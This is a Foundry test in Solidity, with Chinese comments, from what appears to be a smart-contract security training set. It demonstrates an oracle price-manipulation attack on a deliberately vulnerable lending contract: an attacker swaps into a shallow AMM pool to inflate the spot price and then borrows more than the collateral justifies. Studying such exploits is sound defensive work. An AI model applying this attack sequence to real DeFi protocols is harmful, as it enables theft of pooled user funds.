// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {SimpleERC20} from "../../src/vulns/D45_SimpleERC20.sol";
import {SimpleAMMXYK} from "../../src/vulns/D45_SimpleAMMXYK.sol";
import {D45_SpotOracleLendingVuln} from "../../src/vulns/D45_SpotOracleLendingVuln.sol";

contract D45_PriceManipulation_Test is Test {
    SimpleERC20 t0; // collateral
    SimpleERC20 t1; // debt
    SimpleAMMXYK amm;
    D45_SpotOracleLendingVuln lend;

    address lp = makeAddr("lp");
    address attacker = makeAddr("attacker");

    function setUp() public {
        t0 = new SimpleERC20("Token0", "T0");
        t1 = new SimpleERC20("Token1", "T1");

        amm = new SimpleAMMXYK(t0, t1);
        lend = new D45_SpotOracleLendingVuln(t0, t1, amm);

        // 初始资金
        t0.mint(lp, 1_000 ether);
        t1.mint(lp, 1_000 ether);

        t0.mint(attacker, 1_000 ether);
        t1.mint(attacker, 1_000 ether);

        // 借贷池给足可借出的 t1
        t1.mint(address(lend), 10_000 ether);

        // 建一个“很小”的池子：100:100（低流动性）
        vm.startPrank(lp);
        t0.approve(address(amm), type(uint256).max);
        t1.approve(address(amm), type(uint256).max);
        amm.addLiquidity(100 ether, 100 ether);
        vm.stopPrank();

        // attacker 抵押 10 T0
        vm.startPrank(attacker);
        t0.approve(address(lend), type(uint256).max);
        lend.depositCollateral(10 ether);
        vm.stopPrank();
    }

    function test_attack_manipulates_spot_price_and_increases_borrow_limit()
        public
    {
        uint256 priceBefore = amm.spotPrice0In1();

        uint256 maxBorrowBefore = lend.maxBorrow(attacker);

        // 断言：初始价格接近 1（100:100）
        assertApproxEqAbs(priceBefore, 1e18, 1e14); // 允许极小误差
        emit log_named_uint("priceBefore (1e18)", priceBefore);
        emit log_named_uint("maxBorrowBefore", maxBorrowBefore);

        // 攻击：用大量 t1 买 t0（把 t0 储备买走，使 t0 变“更贵”）
        // 低流动性池里，这会显著抬高 price0In1 = reserve1/reserve0
        vm.startPrank(attacker);
        t1.approve(address(amm), type(uint256).max);
        amm.swapExactIn(address(t1), 90 ether); // 往池子塞 90 t1，换走不少 t0
        vm.stopPrank();

        uint256 priceAfter = amm.spotPrice0In1();
        uint256 maxBorrowAfter = lend.maxBorrow(attacker);

        emit log_named_uint("priceAfter (1e18)", priceAfter);
        emit log_named_uint("maxBorrowAfter", maxBorrowAfter);

        // ✅ D45 核心断言：攻击后 spot price 被显著推高
        // 例如：至少涨到 2 倍（你也可以换成 bps 断言）
        assertGt(priceAfter, priceBefore * 2);

        // ✅ 由于借贷合约用 spot price 估值，攻击后可借额度也变大
        assertGt(maxBorrowAfter, maxBorrowBefore);

        // swap 后（操纵完成后）记录一下 attacker 的 t1 余额
        uint256 balBeforeBorrow = t1.balanceOf(attacker);

        // 演示：攻击者在操纵后借出更多
        vm.startPrank(attacker);
        uint256 extra = maxBorrowAfter - maxBorrowBefore;
        emit log_named_uint("extra (1e18)", extra);
        lend.borrow(extra);
        vm.stopPrank();

        emit log_named_uint("t1.balanceOf(attacker)", t1.balanceOf(attacker));

        // 攻击者拿到了“多借出来的” t1
        assertEq(t1.balanceOf(attacker), balBeforeBorrow + extra);
    }
}
